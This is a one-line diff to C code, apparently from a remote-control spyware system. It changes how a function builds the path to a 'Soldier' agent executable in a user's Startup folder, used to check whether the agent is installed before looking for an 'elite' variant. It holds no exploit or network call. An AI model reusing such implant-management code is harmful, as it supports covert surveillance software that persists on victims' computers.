@@ -72,7 +72,7 @@ DWORD WIN_GetUserRCSStatus(users_struct_t *user_info, rcs_struct_t *rcs_info)
 	HANDLE hfile;
 
 	// Controlla se esiste il Soldier. Altrimenti prosegue a cercare l'elite
-	swprintf_s(rcs_dir, MAX_PATH, L"%s\\%s", user_info->user_startup, rcs_info->soldier_name);
+	swprintf_s(rcs_dir, MAX_PATH, L"%s\\%s.exe", user_info->user_startup, rcs_info->soldier_name);
 	hfile = CreateFile(rcs_dir, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hfile != INVALID_HANDLE_VALUE) {
 		CloseHandle(hfile);
